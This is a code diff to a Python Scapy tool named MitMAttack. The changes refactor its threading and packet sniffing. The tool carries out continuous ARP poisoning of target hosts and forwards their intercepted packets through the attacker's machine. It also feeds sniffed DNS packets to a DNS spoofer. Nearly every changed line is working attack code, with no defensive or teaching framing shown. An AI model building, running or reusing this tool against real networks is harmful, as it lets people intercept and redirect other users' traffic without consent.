@@ -9,7 +9,7 @@ from scapy.layers.inet import IP, UDP
 from scapy.layers.inet6 import IPv6
 from scapy.layers.l2 import ARP, getmacbyip, Ether
 from scapy.main import load_layer
-from scapy.sendrecv import sendp, send, sniff, AsyncSniffer
+from scapy.sendrecv import sendp, send, sniff
 
 import argparse
 import logging
@@ -84,6 +84,12 @@ class MitMAttack:
 
         return interfaces[choice]
 
+    @staticmethod
+    def start_thread(target, *args, **kwargs):
+        # print('Running %s, with' % target.__name__, args, kwargs)
+        th = threading.Thread(target=target, args=args, kwargs=kwargs)
+        th.start()
+
     def main(self):
         """
         Setup continuous arp poisoning and redirect packets between victims via this host
@@ -94,8 +100,9 @@ class MitMAttack:
 
         # start arp poisoning
         if self.arguments.arp_poison:
-            th = threading.Thread(target=self.arp_poison_targets, args=(self.targets,), kwargs={'sleep': 60})
-            th.start()
+            # th = threading.Thread(target=self.arp_poison_targets, args=(self.targets,), kwargs={'sleep': 60})
+            # th.start()
+            self.start_thread(self.arp_poison_targets, self.targets, sleep=60)
             print('Started, arp poisoning')
             self.start_request_forwarding()
 
@@ -141,26 +148,16 @@ class MitMAttack:
                                            pdst=target['ip'])
         sendp(p, iface='enp0s3', verbose=False)
 
+    def forwarding_filter(self, pkt):
+        return IP in pkt and pkt[IP].dst != self.host_ip and pkt[Ether].dst == self.host_mac
+
     def start_request_forwarding(self):
         """
         Setup request forwarding of the targets
         :return:
         """
-        # get packets sends to use but for another ip
-        filter_requests = 'ether proto ip and not dst host %s and ether dst %s' % (self.host_ip, self.host_mac)
-        # filter_requests = 'not dst host %s' % (self.host_ip, )
-        filter_requests = 'ether dst %s' % (self.host_mac, )
-
-        filter_requests = str(filter_requests)
-        print(type(filter_requests))
-        print(filter_requests)
-        t = AsyncSniffer(filter=filter_requests, prn=lambda x: x.summary(), iface=self.network_interface)
-
-        # t = AsyncSniffer(filter=filter_requests, prn=self.get_request_forwarding(), iface=self.network_interface)
-        t.start()
-        # t.stop()
-        # t = AsyncSniffer(prn=lambda x: x.summary(), iface=self.network_interface)
-        # t.start()
+        self.start_thread(target=sniff, lfilter=self.forwarding_filter, prn=self.get_request_forwarding(),
+                          iface=self.network_interface)
 
     def get_request_forwarding(self):
         def forward_request(p):
@@ -169,6 +166,7 @@ class MitMAttack:
             :param p: the packet we received
             :return:
             """
+            print(p.summary())
             for target in self.targets:
                 if p[IP].dst == target['ip']:
                     p[Ether].dst = target['mac']
@@ -186,8 +184,10 @@ class MitMAttack:
         This function is responsible for sniffing for DNS packets and forwarding them to the spoofer.
         :return:
         """
-        t = AsyncSniffer(filter=self.dns_filter, prn=self.get_dns_spoofer(), iface=self.network_interface)
-        t.start()
+        self.start_thread(target=sniff, filter=self.dns_filter, prn=self.get_dns_spoofer(),
+                          iface=self.network_interface)
+        # t = AsyncSniffer(filter=self.dns_filter, prn=self.get_dns_spoofer(), iface=self.network_interface)
+        # # t.start()
 
     def get_dns_spoofer(self):
         def dns_spoofer(p):
